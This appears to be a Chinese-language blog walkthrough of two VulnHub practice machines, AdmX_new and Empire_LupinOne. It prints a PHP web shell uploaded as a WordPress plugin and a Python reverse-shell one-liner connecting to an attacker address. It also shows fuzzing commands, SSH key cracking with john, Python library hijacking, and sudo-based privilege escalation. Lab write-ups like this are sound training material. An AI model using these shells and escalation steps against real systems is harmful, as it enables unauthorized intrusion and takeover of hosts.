---
title: Vuln AdmX_new & Empire_LupinOne
published: 2024-12-12
pinned: false
description: Vuln AdmX_new & Empire_LupinOne wp
tags: ['vuln']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2024-12-12
pubDate: 2024-12-12
---


## AdmX_new
### 靶场链接
https://download.vulnhub.com/admx/AdmX_new.7z
### 日常扫描
![image.png](https://www.helloimg.com/i/2025/02/01/679dd5311e56b.png)
只有80端口开放，直接访问没什么东西，dirb扫描出来wordpress，访问看看，发现很慢，burp抓包发现重定向到192.168.159.145
![image-1.png](https://www.helloimg.com/i/2025/02/01/679dd52e24b43.png)
### getshell
wordpress的后台登陆在wp-login.php,爆破账号密码得到admin/adam14,进入后台第一时间想着图片马传上去，然后蚁剑连接，结果一直失败，后面发现可以传插件，打包成zip传上去

```
<?php
if(isset($_GET['cmd']))
        {
                system($_GET['cmd']);
        }

?>
```
尝试访问http://192.168.64.9/wordpress/wp-content/plugins/wordpress_getshell.php?cmd=id
![image-2.png](https://www.helloimg.com/i/2025/02/01/679dd530c78d5.png)
哎，可以执行，尝试python反弹shell
>python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.64.3",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

![image-3.png](https://www.helloimg.com/i/2025/02/01/679dd52e2272e.png)
![image-4.png](https://www.helloimg.com/i/2025/02/01/679dd531a572c.png)
### 提权
成功之后sudo -l看看文件执行权限，发现
![image-5.png](https://www.helloimg.com/i/2025/02/01/679dd52f147d6.png)
直接执行这个，
![image-6.png](https://www.helloimg.com/i/2025/02/01/679dd52e8c7a0.png)
成功拿到root

## Empire_LupinOne
### 靶场链接
https://www.vulnhub.com/entry/empire-lupinone,750/
### 扫描
![image.png](https://www.helloimg.com/i/2025/02/01/679dd7a31fbbe.png)
访问80端口看看
![image-1.png](https://www.helloimg.com/i/2025/02/01/679dd7a18e13e.png)
一个图片，源码里面也什么都没有
dirb直接扫目录啥都没有，robots.txt里面有一个
![image-2.png](https://www.helloimg.com/i/2025/02/01/679dd7a049265.png)
但是访问这个页面又是一个404,在旧版本的Apache服务器中，~ 指代用户主目录，可以用fuzz进行测试
>wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt --hc 403,404 http://192.168.64.15/~FUZZ

扫描出来secret页面，
![image-3.png](https://www.helloimg.com/i/2025/02/01/679dd7a3c06f4.png)
大概发现是有个账号，还缺一个密码，在这个下面继续探测
>wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hc 404,403 -u http://192.168.64.15/~secret/.FUZZ.txt

发现.mysecret.txt，访问一下
![image-4.png](https://www.helloimg.com/i/2025/02/01/679dd79f9cf8a.png)
### getshell
估计就是ssh的密钥，不过被简单的加密了，扔厨子里面，base58直接出来
返回kali，vim一个sshkey，扔进去，然后用join暴力破解
>/usr/share/john/ssh2john.py sshkey > hash
john --wordlist=/usr/share/wordlists/fasttrack.txt hash

得到密码P@55w0rd!
![image-5.png](https://www.helloimg.com/i/2025/02/01/679dd79fa58da.png)

### 提权
sudo -l看看
![image-6.png](https://www.helloimg.com/i/2025/02/01/679dd79fb94e6.png)
大概是自己写了个python库，然后这个python文件可以执行他，而且是另一个号的权限，那么就可以通过这个提权，
>find /usr/ -name '*webbrowser*'
/usr/lib/python3.9/webbrowser.py

![image-7.png](https://www.helloimg.com/i/2025/02/01/679dd7a33af38.png)
往里面写一个binsh试试（这个靶机怎么vim都没有啊啊）
![image-8.png](https://www.helloimg.com/i/2025/02/01/679dd7a5c037c.png)
执行之后确实提升权限了，但是还不是root，再来sudo -l一下，发现可以执行pip，直接pip提权
![image-9.png](https://www.helloimg.com/i/2025/02/01/679dd7a367e37.png)
这个时候就结束了